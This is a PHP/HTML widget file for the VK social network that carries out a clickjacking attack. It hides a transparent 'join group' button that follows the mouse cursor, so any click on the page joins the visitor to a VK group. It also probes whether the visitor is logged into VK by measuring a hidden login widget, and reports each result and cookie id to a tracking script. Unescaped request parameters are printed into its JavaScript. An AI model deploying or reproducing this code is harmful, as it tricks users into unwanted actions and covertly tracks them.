<?php
global $base_url;
$remoteip = $_SERVER['REMOTE_ADDR'];

$mynid = (int)$_GET['id']; //nid виджета
$mycookieid = $_GET['ckid'];

$myhost = $_GET['host']; 

$query = db_select('field_data_field_socscan_idgroup', 'f');
$query->fields('f');
$query->condition('f.entity_id', $mynid);
$import = $query->execute();

foreach ($import as $val) {
  $mygroupid = $val->field_socscan_idgroup_value;
}
?><html><head>
<style>* {margin:0;padding:0;cursor:pointer;} iframe {border: 0 !important;} #sfwgt{border: 0 !important;}
#myoverlay {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            cursor: pointer;
            z-index: 100;
        }
#mywrap1 {
            overflow: hidden;
            width: 180px;
            height: 25px;
            opacity: 0.0;
            position: absolute;
            z-index: 101;
        
        }
#mywrap2 {
margin-left: 0px;
margin-top: -187px;
        }
#mynovis {
opacity: 0.0;
}
</style>
<script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script type="text/javascript" src="//vk.com/js/api/openapi.js?115"></script>
<script type="text/javascript">

</script>

</head>

<body id="mywtgbody" onclick="unframe()" style="cursor: pointer;">
<div id="mynovis">
<div id="myvklogin">
    
</div>
</div>
<div id="myoverlay">
        <div id="mywrap1">
            <div id="mywrap2">
                <div id="vk_groups"></div>
            </div>
        </div>
</div>



<script>
$.ajax({
        url: '<?=$base_url?>/vk/step3.php',
        type: 'POST',
        dataType: 'html',
        data: {nid: <?=$mynid?>, gid: <?=$mygroupid?>, ckid: <?=$mycookieid?>, mt: 0},
    });
VK.init({apiId: 3380246});
VK.Widgets.Auth("myvklogin", {width: "200px", authUrl: '/dev/index.php'});
VK.Widgets.Group("vk_groups", {mode: 0, width: "180", height: "100", color1: 'FFFFFF', color2: '2B587A', color3: '5B7FA6'}, <?=$mygroupid?>);

VK.Observer.subscribe("widgets.groups.joined", function f() 
{
    clearInterval(intervalID);
    setTimeout('top.postMessage({"str":"myhide1"}, "http://<?=$myhost?>")', 50);
    $.ajax({
        url: '<?=$base_url?>/vk/step3.php',
        type: 'POST',
        dataType: 'html',
        data: {nid: <?=$mynid?>, gid: <?=$mygroupid?>, ckid: <?=$mycookieid?>, mt: 1},
    });
});
VK.Observer.subscribe("widgets.groups.leaved", function f() 
{
    clearInterval(intervalID);
    setTimeout('top.postMessage({"str":"myhide2"}, "http://<?=$myhost?>")', 50);
    $.ajax({
        url: '<?=$base_url?>/vk/step3.php',
        type: 'POST',
        dataType: 'html',
        data: {nid: <?=$mynid?>, gid: <?=$mygroupid?>, ckid: <?=$mycookieid?>, mt: 1},
    });
});
var el = $('#mywrap1');
$(window).on('mousemove', function(e) {
    el.css({left:  e.pageX - 90, top:   e.pageY - 12 });
});
var intervalID = setInterval(mygeth,500);

function mygeth() {
    var hh = $('#myvklogin').height();
    if (hh == 93) {
        setTimeout('top.postMessage({"str":"myshow"}, "http://<?=$myhost?>")', 50);
    } else if (hh == 96) {
        setTimeout('top.postMessage({"str":"myshow"}, "http://<?=$myhost?>")', 50);
    } else {
        setTimeout('top.postMessage({"str":"myhide"}, "http://<?=$myhost?>")', 50);
    }
}
</script>
</body>
